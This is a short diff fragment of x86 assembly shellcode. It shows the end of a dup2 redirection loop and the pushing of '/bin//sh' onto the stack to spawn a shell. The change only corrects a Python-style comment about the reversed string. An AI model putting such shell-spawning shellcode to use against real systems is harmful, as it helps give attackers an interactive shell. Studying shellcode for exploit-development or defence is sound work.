@@ -77,7 +77,7 @@ dup2_loop:
 	; spawning as shell
 	xor eax, eax
 	push eax
-	; '/bin//sh'[::1] <- reverse mode
+	; '/bin//sh'[::-1] <- reverse mode
         push 0x68732f2f ; hs//
         push 0x6e69622f ; nib/
 	mov ebx, esp
